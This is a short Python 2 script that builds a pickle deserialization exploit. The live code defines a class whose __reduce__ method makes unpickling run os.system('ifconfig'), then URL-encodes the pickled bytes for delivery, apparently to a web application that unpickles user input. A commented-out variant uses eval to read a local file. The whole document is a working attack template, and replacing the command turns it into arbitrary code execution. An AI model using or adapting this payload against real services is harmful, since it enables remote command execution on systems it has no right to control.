import pickle,os
# class Test(object):
#     def __init__(self):
#         self.a = 1
#         self.b = '2'
#         self.c = '3'
#     def __reduce__(self):
#         return (eval, ("open('ikun.py','r').read()",))
#
# aa = Test()
# bb = pickle.dumps(aa)
# print pickle.loads(bb)

import pickle
import urllib

class payload(object):
    def __reduce__(self):
       return (os.system, ("ifconfig",))

a = pickle.dumps(payload())
a = urllib.quote(a)

print a
